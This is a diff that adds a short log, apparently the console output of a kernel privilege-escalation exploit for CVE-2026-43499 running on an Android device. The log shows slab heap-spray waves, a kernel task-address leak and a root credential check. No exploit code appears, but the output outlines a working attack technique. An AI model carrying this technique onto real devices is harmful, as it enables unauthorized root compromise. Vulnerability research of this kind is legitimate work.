@@ -1,0 +1,10 @@
+[33m[*] [0mCVE-2026-43499 trigger_reclaim v12 DIRECT (Path B) probe
+[33m[*] [0mcred_uid=0 (uid=0 root (root_check kills))
+[33m[*] [0mdelta=-3616 kphys=0xa8000000 collisions=16 slabs=32 shift=0
+[33m[*] [0m[drain] waves=5 batch=400
+LT parent pid=8776 child=11758 (poke: kill -USR1 8776)
+[ev] written to /data/local/tmp/bootA_lt_ev.txt
+[33m[*] [0m[LT] child: perf self-leak...
+[33m[*] [0mperf task: 0xffffff8798ed0000 (57/256 votes)
+LT child_task = 0xffffff8798ed0000 pid=11758
+[ev] written to /data/local/tmp/bootA_lt_ev.txt
